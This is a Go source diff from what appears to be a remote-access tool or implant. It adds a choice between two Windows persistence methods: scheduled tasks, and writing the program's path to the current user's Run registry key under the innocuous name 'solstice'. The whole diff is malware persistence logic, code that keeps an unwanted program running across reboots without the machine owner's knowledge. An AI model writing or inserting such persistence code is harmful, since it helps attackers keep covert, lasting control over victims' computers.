@@ -108,12 +108,22 @@ func schtaskPersistence() error {
 	return err
 }
 
-func addPersistentCommand() error {
+func startUpPersistence() error {
 	path, er := GetPath()
 	if er != nil {
 		log.Println(er)
 	}
 	err := WriteRegistryKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "solstice", path)
+	return err
+}
+
+func addPersistentCommand(persistenceType string) error {
+	var err error
+	if persistenceType == "Schtasks" {
+		err = schtaskPersistence()
+	} else if persistenceType == "Startup" {
+		err = startUpPersistence()
+	}
 	return err
 }
 
